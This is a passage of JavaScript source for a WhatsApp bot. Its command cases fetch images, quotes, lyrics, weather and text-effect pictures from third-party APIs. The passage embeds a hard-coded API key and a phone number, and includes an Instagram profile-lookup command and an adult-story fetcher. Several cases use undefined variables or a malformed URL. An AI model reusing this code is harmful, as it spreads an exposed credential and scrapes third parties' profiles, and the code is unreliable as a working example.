 257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`
				hypermod.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuk, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
case 'owner':
                    case 'adminbot':
                    case 'creator':
                    try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				yuz = await getBuffer(pporang)
                    hypermod.sendMessage(from, {displayname: "Jeff", vcard: kontol}, MessageType.contact, { quoted: mek})
                  hypermod.sendMessage(from, 'හයිපර් තමා හැදුවේ තේරෙන්නෙ නැති දෙයක් තියෙනවනම් අහගන්න ඉන්බොක් එන්න wa.me/94767043432',MessageType.text, { quoted: mek} )
                  ini_buffer = await getBuffer("https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg")
                  hypermod.sendMessage(from, yuz, MessageType.image, {quoted: mek, caption: `HAI ${pushname}\nsubscribe කරපන් ගුටි නොකා[(>_<)] අන්නඒකයි\nhttps://youtube.com/c/HYPERMOD\n\nතව මොනවද බලන්නේ hyper තමාහ් ${pushname}😆`})
                  break
//CASE RIMURUBOTZ/NAYLA
                 case 'tebakgambar':  
                    anu = await fetchJson(`https://videfikri.com/api/tebakgambar/`)
                    anu1 = await getBuffer(anu.result.soal_gbr)
                    anu2 = `➻ *JAWABAN* : ${anu.result.jawaban}`
                    setTimeout( () => {
                    hypermod.sendMessage(from, anu1, image,{caption: 'JAWAB BRO... WAKTU 60 DETIK', quoted: mek})
                    }, 1)
                    setTimeout( () => {
                    costum('50 DETIK LAGI', text, tescuk, cr)
                    }, 10000)                                                                                                                                   
                    setTimeout( () => {
                    costum('40 DETIK LAGI', text, tescuk, cr)
                    }, 20000)    
                    setTimeout( () => {
                    costum('30 DETIK LAGI', text, tescuk, cr)
                    }, 30000)    
                    setTimeout( () => {
                    costum('20 DETIK LAGI', text, tescuk, cr)
                    }, 40000)                                       
                    setTimeout( () => {
                    costum('10 DETIK LAGI', text, tescuk, cr)
                    }, 50000)                                                                                                                                                     
                    setTimeout( () => {
                    hypermod.sendMessage(from, anu2, text,{quoted: mek})                   
                    }, 60000)                                                                          
                    break
                     case 'quotesnime':  
                    anu = await fetchJson(`https://videfikri.com/api/anime/randomquoteanime`)
                    anu1 = `➻ *ANIME* : ${anu.result.anime}\n`
                    anu1 += `➻ *KARAKTER* : ${anu.result.character}\n`
                    anu1 += `➻ *QUOTES* : ${anu.result.quotes}\n`
                    hypermod.sendMessage(from, anu1, text, {quoted: mek})
                    break
//DARI SINI
                   case 'lazimedia':  
                   if (args.length < 1) return reply('MASUKKAN NAMA PRODUK')
                   anu = await fetchJson(`https://videfikri.com/api/lazymed/?query=${body.slice(11)}`)   
                   anu1 = `${anu.result.data}`
                   reply(anu1)
                   break
                   case 'covid':  
                   anu = await fetchJson(`https://videfikri.com/api/rsrujukan/`)
                   anu1 = 'COVID INDONESIA :\n'
                   for (var x of anu.result.data) {
                   anu1 = `➻ *RUMAH SAKIT* : ${x.rumah_sakit}\n`
                   anu1 += `➻ *KOTA* : ${x.region}\n`
                   anu1 += `➻ *PROVINSI* : ${x.provinsi}\n`
                   anu1 += `➻ *ALAMAT* : ${x.address}\n`
                   anu1 += `➻ *PHONE* : ${x.phone}\n`
                   }
                   reply(anu1)
                   break
                   case 'wikiid':  
                   if (args.length < 1) return reply('MASUKKAN QUERY') 
                   anu = await fetchJson(`https://videfikri.com/api/wiki/?query=${body.slice(8)}`)   
                   anu1 = 'WIKI SOAL ID :\n'
                   for (var x of anu.result) {
                   anu1 = `➻ *JUDUL* : ${x.judul}\n`
                   anu1 += `➻ *PAGEID* : ${x.pageid}\n`
                   anu1 += `➻ *ULASAN* : ${x.isi_konten}\n`
                   }
                   hypermod.sendMessage(from, anu1, text,{quoted: mek})
                   break  
                   case 'wikien':  
                   if (args.length < 1) return reply('MASUKKAN QUERY') 
                   anu = await fetchJson(`https://videfikri.com/api/wikieng/?query=${body.slice(8)}`)   
                   anu1 = 'WIKI SOAL EN :\n'
                   for (var x of anu.result) {
                   anu1 = `➻ *JUDUL* : ${x.title}\n`
                   anu1 += `➻ *PAGEID* : ${x.pageid}\n`
                   anu1 += `➻ *ULASAN* : ${x.desc}\n`
                   }
                   hypermod.sendMessage(from, anu1, text,{quoted: mek})
                   break   
                   case 'covidid':  
                   anu = await fetchJson(`https://videfikri.com/api/covidindo/`)
                   anu1 = `➻ *NEGARA* : ${anu.result.country}\n`
                   anu1 += `➻ *POSITIF* : ${anu.result.positif}\n`
                   anu1 += `➻ *SEMBUH* : ${anu.result.sembuh}\n`
                   anu1 += `➻ *MENINGGAL* : ${anu.result.meninggal}\n`
                   anu1 += `➻ *RAWAT* : ${anu.result.dalam_perawatan}\n`
                   reply(anu1)
                   break
                   case 'kbbi':  
                   if (args.length < 1) return reply('MASUKKAN QUERY')
                   anu2 = await fetchJson(`https://videfikri.com/api/kbbi/?query=${body.slice(6)}`)                      
                   anu1 = `➻ *HASIL* : ${anu2.result.hasil}\n`                   
                   reply(anu1)
                   break
                   case 'infogempa':  
                   anu = await fetchJson(`https://videfikri.com/api/infogempa/`)
                   anu1 = `➻ *WILAYAH* : ${anu.result.wilayah}\n`
                   anu1 += `➻ *BUJUR* : ${anu.result.bujur}\n`
                   anu1 += `➻ *LINTANG* : ${anu.result.lintang}\n`
                   anu1 += `➻ *WAKTU* : ${anu.result.waktu}\n` 
                   anu1 += `➻ *MAGNITUDO* : ${anu.result.magnitudo}\n` 
                   anu1 += `➻ *KEDALAMAN* : ${anu.result.kedalaman}\n` 
                   anu1 += `➻ *MAP* : ${anu.result.map}\n`
                   hypermod.sendMessage(from, anu1, text,{quoted: mek})
                   break
                   case 'randomquran':  
                   anu = await fetchJson(`https://api.zeks.xyz/api/randomquran`)
                   anu1 = `➻ *NOMER* : ${anu.result.nomor}\n`
                   anu1 += `➻ *NAMA* : ${anu.result.nama}\n`
                   anu1 += `➻ *ASMA* : ${anu.result.asma}\n`
                   anu1 += `➻ *AYAT* : ${anu.result.ayat}\n`
                   anu1 += `➻ *NAME* : ${anu.result.name}\n`
                   anu1 += `➻ *TYPE* : ${anu.result.tipe}\n`
                   anu1 += `➻ *NO URUT* : ${anu.result.no_urut}\n`
                   anu1 += `➻ *RUKUK* : ${anu.result.rukuk}\n`
                   anu1 += `➻ *ARTI* : ${anu.result.arti}\n`
                   anu1 += `➻ *KETERANGAN* : ${anu.result.keterangan}\n`
                   hypermod.sendMessage(from, anu1, text,{quoted: mek})
                   break                                   
                   case '8bit':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} kamu&aku*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   var F = body.slice(6)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/8bit/?text1=${F1}&text2=${F2}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'google':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} kamu & aku & dia*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]
                   var F3 = F.split("&")[2] 
                   anu = await getBuffer(`https://api-alphabot.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${Alphakey}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'fire':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/crossfirelogo/?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'burn':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://api-alphabot.herokuapp.com/api/textmaker/random?text=${darknn}&theme=text-burn&apikey=${Alphakey}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'battle':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://api-alphabot.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${Alphakey}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'mug':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(5)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/candlemug/?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                    case 'love':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/lovemsg/?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek}) 
                   break 
                   case 'mug1':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/mugflower?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek}) 
                   break 
                   case 'naruto':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/narutobanner?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek}) 
                   break 
                   case 'glass':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/paperonglass?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek}) 
                   break 
                   case 'romance':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(9)				    
                   anu = await getBuffer(`hthttps://videfikri.com/api/textmaker/romancetext?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek}) 
                   break 
                   case 'shadow':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/shadowtext?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   
                   case 'glich':
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/tiktokeffect?text1=${F1}&text2=${F2}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'coffe':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://api-alphabot.herokuapp.com/api/textmaker/senja?text=${darknn}&theme=coffee-cup&apikey=${Alphakey}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break  
                   case 'coffe1':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://api-alphabot.herokuapp.com/api/textmaker/senja?text=${darknn}&theme=coffee-cup2&apikey=${Alphakey}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'neon':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://api-alphabot.herokuapp.com/api/textmaker/metallic?text=${darknn}&theme=neon&apikey=${Alphakey}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break  
                   case 'pubg':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   var F = body.slice(6)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/pubgmaskot?apikey=04c75aad4f01fc5f7166c03f&text=${q}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'water':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/watercolor?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break 
                   case 'silk':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   var F = body.slice(6)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/silk?text1=${F1}&text2=${F2}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'potter':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/hpotter?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'candy':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/sweetcandy?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break                     
                   case 'block':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/woodblock?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break           	                                                            
                    case 'artinama':  
                    if (args.length < 1) return reply('MASUKKAN NAMA')
                    F = body.slice(10)
                    anu = await fetchJson(`https://videfikri.com/api/primbon/artinama/?nama=${F}`)
                    anu1 = `➻ *ARTI* : ${anu.result.arti}\n`
                    anu1 += `➻ *ULASAN* : ${anu.result.desk}\n`
                    reply(anu1)
                    break
                    case 'artimimpi':  
                    if (args.length < 1) return reply('MASUKKAN MIMPI MU')
                    F = body.slice(11)
                    anu = await fetchJson(`https://videfikri.com/api/primbon/artimimpi/?mimpi=${F}`)
                    anu1 = `➻ *ARTI* : ${anu.result.artimimpi}\n`
                    reply(anu1)
                    break
                    case 'artijadian':  
                    if (args.length < 1) return reply('MASUKKAN tanggal&bulan&tahun')
                    var F = body.slice(12)
				    var F1 = F.split("&")[0];
				    var F2 = F.split("&")[1];
				    var F3 = F.split("&")[2]	
                    anu = await fetchJson(`https://videfikri.com/api/primbon/tgljadian/?tgl=${F1}&bln=${F2}&thn=${F3}`)
                    anu1 = `➻ *ARTI* : ${anu.result.hasil}\n`
                    reply(anu1)
                    break
                    case 'chord':  
                    if (args.length < 1) return reply('MASUKKAN JUDUL LAGU')  
                    F = body.slice(7)
                    anu = await fetchJson(`https://videfikri.com/api/chord/?query=${F}`)
                    anu1 = `➻ *CHORD* : ${anu.result.chord}\n`
                    reply(anu1)
                    break
                    case 'lirik':  
                    if (args.length < 1) return reply('MASUKKAN JUDUL LAGU')  
                    F = body.slice(7)
                    anu = await fetchJson(`https://videfikri.com/api/liriklagu/?query=${F}`)
                    anu1 = `➻ *ARTIS* : ${anu.result.artist}\n`
                    anu1 += `➻ *LIRIK* : ${anu.result.lirik}\n` 
                    reply(anu1)
                    break
                  case 'pinterest2':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} https://link*`)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   F = body.slice(11)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/pinterest?url=${F}`)
                   anu1 = await getBuffer(anu.result)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
case 'foto': case 'pinterest':              
				    hypermod.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${args[0]}`, {method: 'get'})
				    reply('ඉදහන් හයිපර් හදලා එවන්නම්👻')
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    hypermod.sendMessage(from, pok, image, { quoted: mek})
				    hypermod.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${args[0]}`, {method: 'get'})
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    hypermod.sendMessage(from, pok, image, { quoted: mek})
				    hypermod.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${args[0]}`, {method: 'get'})
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    hypermod.sendMessage(from, pok, image, { quoted: mek})
				    hypermod.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${args[0]}`, {method: 'get'})
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    hypermod.sendMessage(from, pok, image, { quoted: mek})
				    break
                   case 'qrcode':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} halo sayang*`)  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   F = body.slice(8)
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/qrcode?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'resepmasakan':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bakso*`)
                   F = body.slice(14)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/resep?q=${F}`)
                   anu1 = await getBuffer(anu.img)
                   anu2 = `➻ *NAMA* : ${anu.title}\n`
                   anu2 += `➻ *STATUS* : ${anu.langkah}\n`
                   anu2 += `➻ *BAHAN* : ${anu.bahan}\n`
                   hypermod.sendMessage(from, anu1, image, {caption: anu2, quoted: mek})
                   break
                   case 'barcode':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} halo sayang*`)  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   F = body.slice(9)
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/barcode_maker?text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'cersex':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cersex`)                   
                   anu2 = `➻ *JUDUL* : ${anu.result.judul}\n`
                   anu2 += `➻ *NAMA* : ${anu.result.cersex}\n`
                   reply(anu2)
                   break
                   case 'cerpen':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)                   
                   anu1 = `➻ *JUDUL* : ${anu.result.title}\n`
                   anu1 += `➻ *PENGARANG* : ${anu.result.pengarang}\n` 
                   anu1 += `➻ *KATEGORI* : ${anu.result.kategori}\n`
                   anu1 += `➻ *CERPEN* : ${anu.result.cerpen}\n`
                   reply(anu1)
                   break                   
                   case 'tongue':  
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
                   anu1 = `➻ *NIHH* : ${anu.result}`
                   reply(anu1)
                   break
                   case 'jadwalsholat':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} makassar*`)  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   F = body.slice(14)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwalshalat?daerah=${F}`)                   
                   anu1 = `➻ *IMSYAK* : ${anu.Imsyak}\n`
                   anu1 += `➻ *SUBUH* : ${anu.Subuh}\n`
                   anu1 += `➻ *DHUHA* : ${anu.Dhuha}\n`
                   anu1 += `➻ *DZUHUR* : ${anu.Dzuhur}\n`
                   anu1 += `➻ *ASHAR* : ${anu.Ashar}\n`
                   anu1 += `➻ *MAGRHRIB* : ${anu.Maghrib}\n`
                   anu1 += `➻ *ISYA* : ${anu.Isya}\n` 
                   reply(anu1)
                   break
                   case 'cuaca':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} makassar*`)  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   F = body.slice(7)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cuaca?q=${F}`)
                   anu1 = `➻ *TEMPAT* : ${anu.result.tempat}\n`
                   anu1 += `➻ *CUAXA* : ${anu.result.cuaca}\n`
                   anu1 += `➻ *DESK* : ${anu.result.desk}\n` 
                   anu1 += `➻ *SUHU* : ${anu.result.suhu}\n`
                   anu1 += `➻ *KELEBAPAN* : ${anu.result.kelembapan}\n` 
                   anu1 += `➻ *UDARA* : ${anu.result.udara}\n`
                   anu1 += `➻ *ANGIN* : ${anu.result.angin}\n` 
                   reply(anu1)
                   break 
                   case 'stalkig':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} jokowi*`)
                   F = body.slice(9)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/igstalk?username=${F}&apikey=apivinz`)
                   anu1 = await getBuffer(anu.profile_pic)
                   anu2 = `➻ *NAMA* : ${anu.username}\n`
                   anu2 += `➻ *FULLNAME* : ${anu.fullname}\n`
                   anu2 += `➻ *FOLLOWERS* : ${anu.follower}\n`
                   anu2 += `➻ *FOLLOWING* : ${anu.following}\n`
                   anu2 += `➻ *VERIFY* : ${anu.is_verified}\n`
                   anu2 += `➻ *BISNIS* : ${anu.is_bussiness}\n`
                   anu2 += `➻ *PRIVATE* : ${anu.is_private}\n`
                   anu2 += `➻ *BIO* : ${anu.bio}\n`
                   anu2 += `➻ *SOURCE* : ${anu.source}\n`
                   hypermod.sendMessage(from, anu1, image, {caption: anu2, quoted: mek})
                   break
                   case 'quran':  
                   anu = await fetchJson(`https://api.zeks.xyz/api/randomquran`)
                   anu1 = `➻ *ASMA* : ${anu.result.asma}\n`
                   anu1 += `➻ *ARTI* : ${anu.result.arti}\n`
                   anu1 += `➻ *AYAT* : ${anu.result.ayat}\n`
                   anu1 += `➻ *NOMOR* : ${anu.result.nomor}\n`
                   anu1 += `➻ *RUKUK* : ${anu.result.rukuk}\n`
                   anu1 += `➻ *TYPE* : ${anu.result.type}\n`
                   anu1 += `➻ *URUT* : ${anu.result.urut}\n`                                                                            
                   anu1 += `➻ *KETERANGAN* : ${anu.result.keterangan}\n`
                   reply(anu1)
                   break
                   case 'estetikpic':  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/estetikpic?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result.result)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'memeindo':  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'darkjokes':  
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await fetchJson(`https://api.zeks.xyz/api/darkjokes?apikey=apivinz`)
                   anu1 = await getBuffer(anu.result)
                   hypermod.sendMessage(from, anu1, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'nickff': 
                   anu = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=Alphabott`)
                   anu1 = `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   anu1 += `➻ *NIHH* : ${anu.result}\n`
                   reply(anu1)
                   break
                   case 'tahta':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(7)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${F}&apikey=Alphabott`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break
                   case 'neon2':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(7)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=Alphabott&text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break                    
                   case 'wall':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(6)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/breakwall?apikey=Alphabott&text=${F}`)
                   hypermod.sendMessage(from, anu, image, {caption: `හයිපර් තමා හොදටම කරේ `, quoted: mek})
                   break   
                   case 'wolf':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hypermod*`)
                   F = body.slice(6)
                   reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=Alphabott&text1=zeeoneofc&text2=${F}`)
